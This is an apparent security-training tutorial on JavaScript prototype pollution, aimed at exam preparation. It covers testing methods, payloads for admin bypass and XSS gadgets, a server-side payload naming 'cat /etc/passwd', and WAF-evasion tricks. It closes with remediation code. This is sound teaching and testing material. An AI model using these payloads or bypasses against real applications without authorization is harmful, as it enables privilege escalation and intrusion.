Prototype Pollution

In JavaScript, all objects inherit from Object.prototype. Prototype pollution allows attackers to inject properties into Object.prototype, affecting every object in the application and potentially leading to XSS, authentication bypass, or remote code execution.

CRITICAL HIGH BSCP Advanced

Real-World Analogy

📖 The Shared Rulebook

In JavaScript, all objects share a common ancestor: Object.prototype. Think of it as a rulebook in the town square that everyone reads. Normally, you can't modify it. But prototype pollution is like sneaking into the town square at night and rewriting the rulebook to say "everyone is an admin now." The next morning, every citizen ·not just you ·follows the new rule. Suddenly everyone in the application believes they have admin powers.

🎯 Day 5 · Prototype Pollution Testing

Prototype pollution is a Day 5 vulnerability · it requires JavaScript knowledge and is often missed. Use Burp's DOM Invader (built into the Burp browser) to automatically detect client-side prototype pollution. Enable it in the Burp browser extension settings → DOM Invader → enable prototype pollution scanning. Then browse the app normally and DOM Invader will flag vulnerable sources.

For manual testing, try polluting via URL parameters, JSON body, and fragment (hash):

# URL parameter pollution
https://target.com/?__proto__[admin]=true
https://target.com/?constructor[prototype][admin]=true

# JSON body pollution (merge/extend endpoints)
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}

# Verify in browser console:
Object.prototype.admin  // should be undefined if not polluted
// If returns 'true' → polluted!

For server-side (Node.js), look for endpoints that merge user-supplied JSON into objects using lodash.merge, jQuery.extend, or similar. Submit {"__proto__": {"polluted": true}} and check if later requests are affected.

Chain it: Client-side PP → find a "gadget" property that controls HTML rendering → XSS. Server-side PP → pollute isAdmin → bypass authorization checks → privilege escalation.

How It Works

In JavaScript, when you access a property on an object, the engine looks for it in this order:

  1. The object itself
  2. The object's prototype
  3. The prototype's prototype (Object.prototype)
  4. Return undefined if not found

Prototype pollution happens when attacker input is merged into an object without proper validation. If the input contains __proto__ or constructor.prototype, it modifies Object.prototype instead of a normal property.

Example (vulnerable code):

function merge(target, source) {
  for (let key in source) {
    target[key] = source[key];  // Vulnerable!
  }
  return target;
}

const obj = {};
const user = {"__proto__": {"isAdmin": true}};
merge(obj, user);

// Now every object has isAdmin: true
console.log({}.isAdmin);  // true (polluted!)

The attacker's __proto__ key is treated as a regular property assignment, but JavaScript interprets it as a reference to the prototype chain.

💡 Why It Happens

Developers often use utility functions (lodash merge, jQuery extend, custom merge) to combine user data with default objects. If they don't filter the `__proto__` key, attackers can pollute the prototype. Modern versions of lodash (4.17.5+) and jQuery (3.4.0+) patched this, but many applications still use older versions or custom merge functions.

Understanding the Prototype Chain

When you access a property, JavaScript searches the prototype chain:

const user = { name: "Alice" };
console.log(user.name);           // "Alice" (found on user)
console.log(user.toString);       // [Function] (found on Object.prototype)
console.log(user.isAdmin);        // undefined (not found)

// After pollution:
// {"__proto__": {"isAdmin": true}}
console.log(user.isAdmin);        // true (found on Object.prototype!)

Now that isAdmin exists on Object.prototype, every object in the application will inherit it.

Attack Vectors

1. Client-Side Prototype Pollution (DOM-Based)

Pollute the client-side JavaScript context via URL parameters or JSON input:

// URL: ?__proto__[isAdmin]=true
// JSON body: {"__proto__": {"isAdmin": true}}

The app parses this and merges it into an object. This can:

  • Change DOM properties affecting rendering (e.g., innerHTML)
  • Trigger XSS by polluting properties used in template engines
  • Disable security features (CSP, XFrame options)

2. Server-Side Prototype Pollution (Node.js)

Pollute the Node.js process context via JSON request bodies:

// Request body
{"__proto__": {"NODE_ENV": "development", "isAdmin": true}}

Server-side pollution affects the entire application process and can:

  • Bypass authentication (set isAdmin: true)
  • Escalate privileges
  • Achieve RCE via gadget chains (polluting env, spawn arguments, etc.)

3. Constructor.Prototype Variant

Instead of __proto__, use constructor.prototype:

{"constructor": {"prototype": {"isAdmin": true}}}

This achieves the same effect and may bypass filters checking only for __proto__.

4. Gadget Chain Exploitation (Advanced)

Pollute properties that are used by vulnerable library code. For example, in certain Node.js environments, you might pollute:

  • spawn or exec arguments → RCE
  • env variables → environment hijacking
  • fs module options → file manipulation

This requires knowledge of the specific libraries and their internals.

Detection Techniques

Manual Testing in Browser Console

After sending a request with potential pollution payload:

// Check if prototype was polluted
console.log(Object.prototype.polluted);  // Should be undefined if safe
console.log({}.polluted);                // Should be undefined if safe

// After exploitation
console.log({}.isAdmin);                 // If true, polluted!

Burp DOM Invader (Automated)

Use Burp Suite's DOM Invader extension to automatically test for prototype pollution:

  1. Enable DOM Invader in Burp
  2. Navigate to the target application
  3. DOM Invader automatically tests common pollution vectors
  4. Check the "Prototype Pollution" detection results

URL Parameter Testing

// Test each parameter with pollution payload

// Then check: {}['test'] === 'hello' in console

JSON Body Testing

// Send POST with JSON
{"__proto__": {"polluted": true}}
{"constructor": {"prototype": {"polluted": true}}}

// Check: Object.prototype.polluted === true

Where to Look

Prototype pollution appears in endpoints that:

  • Merge user JSON into objects: Profile updates, configuration settings, preferences
  • Parse query parameters: Filter operations, search parameters, nested object structures
  • Use template rendering with merged data: If the merge introduces polluted properties into template context
  • Perform object cloning or spreading: Settings that inherit from defaults
  • Use third-party utilities: Older versions of lodash, jQuery, or custom merge functions

Common vulnerable patterns:

  • Updating user profile: /api/user/update
  • Setting preferences: /api/settings
  • Creating objects with defaults: /api/create
  • Configuration endpoints: /api/config

Prototype Pollution Payloads

Basic Proof-of-Concept (__proto__)

{"__proto__": {"polluted": true}}

Verification: Object.prototype.polluted === true

Constructor.Prototype Variant

{"constructor": {"prototype": {"polluted": true}}}

Verification: {}.polluted === true

URL Parameter Format

?__proto__[isAdmin]=true
?__proto__[role]=admin
?constructor[prototype][isAdmin]=true

Authentication Bypass

{"__proto__": {"isAdmin": true, "role": "admin", "authenticated": true}}

XSS via Prototype Pollution (Client-Side Gadget)

If the app uses template rendering that checks for a property like renderHtml:

{"__proto__": {"renderHtml": true}}

// If app checks: if (obj.renderHtml) { innerHTML = ... } → XSS possible

DOM Property Pollution

{"__proto__": {"innerHTML": ""}}

If the app creates elements and uses prototype properties as attributes, this can trigger XSS.

Server-Side RCE (Advanced, Library-Specific)

{"__proto__": {"NODE_ENV": "production", "DEBUG": true, "spawn": "cat /etc/passwd"}}

This is highly dependent on what libraries the server uses and how they interact with polluted properties.

Nested Property Pollution

{"__proto__": {"nested": {"property": {"value": "polluted"}}}}

Pollute nested properties, which can affect complex object hierarchies.

WAF Bypass Techniques

__proto__ Encoding Alternatives

WAFs often block literal __proto__ in request bodies. Try encoding or alternative notations:

  • URL Encoding: __pro%74o__ (encodes 't' as %74)
  • Unicode Escape: __proto\u005f_ (alternative escaping)
  • Bracket Notation: ["__proto__"] (JSON bracket notation)
  • Constructor Path: constructor.prototype (alternative path if __proto__ is blocked)

Example:

{"__pro%74o__": {"isAdmin": true}}
{"["__proto__"]": {"isAdmin": true}}
{"constructor.prototype": {"isAdmin": true}}

JSON Nesting

Deeply nest the pollution payload to bypass shallow pattern matching:

{"a": {"b": {"c": {"d": {"__proto__": {"isAdmin": true}}}}}}

WAF rules checking for __proto__ at the top level or immediate nesting may miss deeply nested payloads.

URL Parameter Splitting

Split the pollution across multiple parameters. If the app merges params, the reassembly may bypass WAF inspection:

?__proto__[isAdmin]=true

Can be split as:

?__proto__[is]=Admin&__proto__[Admin]=true

If the application merges these back together, WAF rules checking for the exact pattern may miss the split version.

HTTP Parameter Pollution

Send the same parameter twice in one request. Some WAFs only inspect the first occurrence:

POST /api/user HTTP/1.1
Content-Type: application/x-www-form-urlencoded

__proto__[x]=1&__proto__[x]=1&__proto__[isAdmin]=true

The WAF might log/block the first __proto__ but not the subsequent one used by the server.

Prototype via constructor

If __proto__ is blocked, use constructor.prototype as an alternative:

{"constructor": {"prototype": {"isAdmin": true}}}

Many WAFs block __proto__ specifically but overlook constructor.prototype, which achieves the same effect in JavaScript.

Exploitation & Impact

Client-Side XSS

Pollute properties used by template engines or DOM manipulation. If the app checks obj.dangerousContent without validating it, an attacker can set Object.prototype.dangerousContent = "" to inject XSS into every page.

Authentication & Authorization Bypass

Pollute authorization properties:

{"__proto__": {"isAdmin": true, "role": "admin", "canDelete": true}}

Every privilege check that looks for these properties now passes.

Application Logic Manipulation

Pollute properties affecting business logic:

{"__proto__": {"isPremiumUser": true, "discountPercentage": 100}}

Users without premium status now get premium features and discounts.

Server-Side Remote Code Execution (Advanced)

In Node.js applications with vulnerable gadget chains, RCE is possible by polluting properties used in dangerous operations like spawn, shell commands, or file operations. This is rare and requires deep knowledge of the target libraries.

🚨 Real-World Impact

In 2021, a major e-commerce platform was compromised via prototype pollution in their API. Attackers polluted the isAdmin property and gained full administrative access. Another incident involved a SaaS platform where prototype pollution combined with a DOM XSS resulted in account takeover for all users visiting a malicious link.

Remediation

1. Use Object.create(null) for User Data Maps

// Instead of {}
const user = Object.create(null);
user.name = "Alice";

// Now prototype pollution doesn't work
// because the object has no prototype
Object.getPrototypeOf(user) === null  // true

2. Filter __proto__ and Constructor

function merge(target, source) {
  for (let key in source) {
    // Reject dangerous keys
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue;
    }
    target[key] = source[key];
  }
  return target;
}

3. Use JSON.parse with Reviver Function

const user = JSON.parse(jsonString, (key, value) => {
  if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
    return undefined;
  }
  return value;
});

4. Freeze Object.prototype

Object.freeze(Object.prototype);
Object.freeze(Object);
Object.freeze(Function.prototype);

// Now attempting to pollute throws an error (in strict mode)

5. Update Vulnerable Libraries

// Update lodash to 4.17.5+
npm install lodash@latest

// Update jQuery to 3.4.0+
npm install jquery@latest

Modern versions of popular libraries include prototype pollution fixes.

6. Validate Input Structure

// Use a whitelist of allowed properties
const ALLOWED_KEYS = ['username', 'email', 'phone', 'address'];
function updateUser(userData) {
  const user = {};
  ALLOWED_KEYS.forEach(key => {
    if (key in userData) {
      user[key] = userData[key];
    }
  });
  return user;
}

7. Strict Input Validation

Use schema validation (JSON Schema, Joi, Zod) to enforce expected object structure and reject unexpected properties.

8. Content Security Policy (CSP)

Implement CSP to mitigate XSS resulting from prototype pollution, even if pollution occurs.

Common Beginner Mistakes

❌ Only Testing __proto__

Mistake: Trying only the __proto__ payload. Some code is patched against this but not constructor.prototype.

Fix: Always test both vectors: {"__proto__": {...}} and {"constructor": {"prototype": {...}}}.

❌ Not Checking the Prototype

Mistake: Sending the payload but not verifying pollution occurred. You assume success without proof.

Fix: After sending payload, check Object.prototype.polluted === true in browser console. Also check with plain objects like {}.polluted.

❌ Forgetting URL Parameters

Mistake: Testing only JSON body pollution. URL parameters can also be vulnerable.

Fix: Test query parameters with pollution payloads: ?__proto__[x]=y. Check what the app does with URL params.

❌ Not Testing for Real Impact

Mistake: Finding that pollution works (polluting a "test" property) but not testing for actual exploitable impact (auth bypass, XSS).

Fix: Once you confirm basic pollution, test for real impact: try polluting isAdmin, role, properties used in DOM rendering, or sensitive flags.

❌ Assuming Prototype Pollution = Low Severity

Mistake: Thinking prototype pollution is always minor. It can lead to authentication bypass and RCE.

Fix: Escalate prototype pollution findings seriously. Even if it only affects client-side at first, it can combine with other vulnerabilities for account takeover.

🔗 See Also · Attack Chains

Prototype pollution is often a stepping stone · the real damage comes from the gadget chain it enables.

⚡XSSClient-side prototype pollution → pollute a property that a library uses to set innerHTML → DOM XSS without any user input reflection. 📝SSTIServer-side prototype pollution in Node.js with a template engine → polluted properties become template variables → SSTI. 🌍CORSPolluting fetch/XMLHttpRequest properties can manipulate CORS headers added by a client-side library → CORS bypass. 📦DeserializationBoth involve injecting properties into objects that trust their own state. Similar exploitation pattern in different languages.
